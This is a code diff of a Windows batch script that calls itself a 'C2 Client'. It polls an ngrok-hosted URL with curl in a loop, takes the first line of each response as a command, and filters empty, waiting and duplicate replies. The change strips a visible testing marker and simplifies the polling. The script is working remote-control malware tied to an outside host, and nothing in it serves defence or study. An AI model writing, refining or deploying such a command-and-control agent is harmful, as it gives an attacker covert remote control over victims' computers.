@@ -3,32 +3,24 @@ setlocal enabledelayedexpansion
 set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev
 set LAST_CMD=
 
-echo [*] Starting C2 Client - TESTING VISIBLE
+echo [*] Starting C2 Client
 echo [*] URL: %URL%
 
 :loop
-    ping -n 3 127.0.0.1 >nul
+    timeout /t 3 /nobreak >nul
     
-    curl -s --max-time 10 %URL% > %TEMP%\c2_raw.txt 2>nul
-    echo [DEBUG] Raw response:
-    type %TEMP%\c2_raw.txt
+    rem Use a simpler method to get command
+    curl -s --max-time 10 %URL% > %TEMP%\c2_raw.txt 2>&1
     
-    set CMD=
-    for /f "usebackq delims=" %%A in (`type %TEMP%\c2_raw.txt ^| findstr /v "^$"`) do (
-        if "!CMD!"=="" (
-            set CMD=%%A
-            echo [DEBUG] Got command: !CMD!
-            goto :got_command
-        )
-    )
-    goto loop
+    rem Read first line only
+    set /p CMD=<%TEMP%\c2_raw.txt
     
-:got_command
+    echo [DEBUG] Got: !CMD!
+    
     if "!CMD!"=="" goto loop
     if "!CMD!"=="WAITING" goto loop
-    
     if "!CMD!"=="!LAST_CMD!" (
-        echo [*] Skipping duplicate: !CMD!
+        echo [*] Duplicate, skipping
         goto loop
     )
     
@@ -44,6 +36,4 @@ echo [*] URL: %URL%
     )
     
     set CMD=
-    timeout /t 2 /nobreak >nul
-    
 goto loop
